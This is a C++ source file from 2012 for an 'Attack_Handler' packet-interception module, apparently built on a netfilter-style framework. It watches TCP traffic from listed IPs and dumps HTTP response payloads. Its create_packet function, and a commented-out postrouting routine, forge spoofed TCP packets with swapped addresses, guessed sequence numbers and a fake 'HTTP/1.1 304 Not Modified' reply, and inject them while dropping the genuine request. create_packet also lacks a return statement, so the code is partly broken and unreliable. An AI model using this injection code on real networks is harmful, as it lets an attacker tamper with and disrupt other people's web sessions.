/*
 * attack_handler.cc
 *
 *  Created on: Nov 27, 2012
 *      Author: philiplundrigan
 */

#include "attack_handler.h"

#define DEBUG(s) if(verbose_) { cout << s << endl; }

Attack_Handler::Attack_Handler() : watch_list_name_("") {
	DEBUG("Creating Attack Handler");
}

Attack_Handler::~Attack_Handler() {
}

void Attack_Handler::parse_options(int argc, char* const argv[]){
	const char * white_list = "white_list";

	static struct option long_options[] = {
		{white_list, required_argument, NULL, 0},
		{0, 0, 0, 0}
	};

	watch_list_name_ = "watch_list";

	OptionParser options;
	options.parse(argc, argv, long_options);

	if(options.present(white_list)) {
		watch_list_name_ = string(options.argument(white_list));
	}

	DEBUG("White list name set to: " << watch_list_name_);
	load_watch_list();
}

void Attack_Handler::prerouting(IPPacket& p) {
    	cout << "Attack_Handler::prerouting" << endl;

	if (p.get_ip_protocol() != TCP) {
		p.accept();
		return;
	}

	TCPPacket packet((Packet &)p, false);
	

	if(on_watch_list(packet) && is_http_response(packet)){
		DEBUG("-------------------------------------");
		DEBUG(packet.to_s());
		char *temp = (char *)packet.get_next_header() + packet.get_tcp_length_bytes();
		DEBUG("Payload: " << temp);
		DEBUG("-------------------------------------");
	}

	p.accept();
}

/*
void Attack_Handler::postrouting(IPPacket & p){
	if (p.get_ip_protocol() != TCP) {
		p.accept();
		return;
	}

	TCPPacket packet((Packet &)p, false);

	//DEBUG("-------------------------------------");
	//DEBUG(packet.to_s());
	//DEBUG("-------------------------------------");

	if(on_watch_list(packet) && is_http_request(packet)){
		DEBUG("Packet on watch list -- filtering it");

		int dest_ip = packet.get_ip_destination_address();
		int src_ip = packet.get_ip_source_address();

		int dest_port = packet.get_tcp_destination_port();
		int src_port = packet.get_tcp_source_port();


		////////// constructing new ACK packet //////////
		TCPPacket ack_packet(packet, true);

		ack_packet.set_ip_source_address(dest_ip);
		ack_packet.set_ip_destination_address(src_ip);
		ack_packet.set_tcp_source_port(dest_port);
		ack_packet.set_tcp_destination_port(src_port);


		////////// constructing new HTTP packet //////////
		TCPPacket new_packet(packet, true);

		// setting the correct information
		new_packet.set_ip_source_address(dest_ip);
		new_packet.set_ip_destination_address(src_ip);
		new_packet.set_tcp_source_port(dest_port);
		new_packet.set_tcp_destination_port(src_port);

		// setting the correct flags and ack
		new_packet.set_tcp_psh(true);
		new_packet.set_tcp_sequence_number(packet.get_tcp_ack_number());
		new_packet.set_tcp_ack_number(packet.get_tcp_sequence_number() + 448);

		char *payload = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
		string new_html = "HTTP/1.1 304 Not Modified\r\nDate: Fri, 30 Nov 2012 23:46:58 GMT\r\nServer: Apache\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=15, max=100\r\nVary: Accept-Encoding\r\n\r\n";
		strcpy(payload, new_html.c_str());

		new_packet.recalculate_tcp_checksum();
	
		
		DEBUG("-------------------------------------");
		DEBUG(new_packet.to_s());
		char *temp = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
		DEBUG("Payload: " << temp);
		DEBUG("-------------------------------------");

		new_packet.accept();
		packet.drop();
		//packet.accept();
	}
	else{
		//DEBUG("Packet NOT on watch list -- ignoring it");
		packet.accept();
	}

	DEBUG("\n");
}
*/
void Attack_Handler::load_watch_list(){
	DEBUG("Loading white list");
	string line;

	if(watch_list != NULL){
		delete watch_list;
	}
	watch_list = new set<string>();

	// open file
	ifstream file(watch_list_name_.c_str());
	if (!file.is_open()) {
		cerr << "Can't open " << watch_list_name_ << endl;
		return;
	}

	// parse file
	while (!file.eof()) {
		getline(file,line);
		if ((line == "") || (line[0] == '#')) {
			continue;
		}
		DEBUG("Inserting " << line << " into watch_list");
		watch_list->insert(line);
	}
}

bool Attack_Handler::on_watch_list(TCPPacket p){
	for (set<string>::iterator it = watch_list->begin(); it != watch_list->end(); it++){
		if(*it == p.get_ip_source_address_s()){
			return true;
		}
	}

	return false;
}

bool Attack_Handler::is_http_response(TCPPacket p){
	char *payload = (char *)p.get_next_header() + p.get_tcp_length_bytes();

	if(strncmp(payload, "HTTP", 4) == 0){
		return true;
	}
	else{
		return false;
	}
}

TCPPacket Attack_Handler::create_packet(TCPPacket & other, TCPPacket & out){
	DEBUG("Creating new packet");

	int dest_ip = other.get_ip_destination_address();
	int src_ip = other.get_ip_source_address();

	int dest_port = other.get_tcp_destination_port();
	int src_port = other.get_tcp_source_port();

	// setting the correct source information
	out.set_ip_source_address(dest_ip);
	out.set_tcp_source_port(dest_port);

	// setting the correct destination information
	out.set_ip_destination_address(src_ip);
	out.set_tcp_destination_port(src_port);

	// setting the correct flags and ack
	out.set_tcp_psh(true);
	out.set_tcp_sequence_number(other.get_tcp_ack_number());
	out.set_tcp_ack_number(other.get_tcp_sequence_number() + 448);

	char *payload = (char *)out.get_next_header() + out.get_tcp_length_bytes();
	string new_html = "HTTP/1.1 304 Not Modified\r\nDate: Fri, 30 Nov 2012 23:46:58 GMT\r\nServer: Apache\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=15, max=100\r\nVary: Accept-Encoding\r\n\r\n";
	
	strcpy(payload, new_html.c_str());

	out.recalculate_tcp_checksum();
}

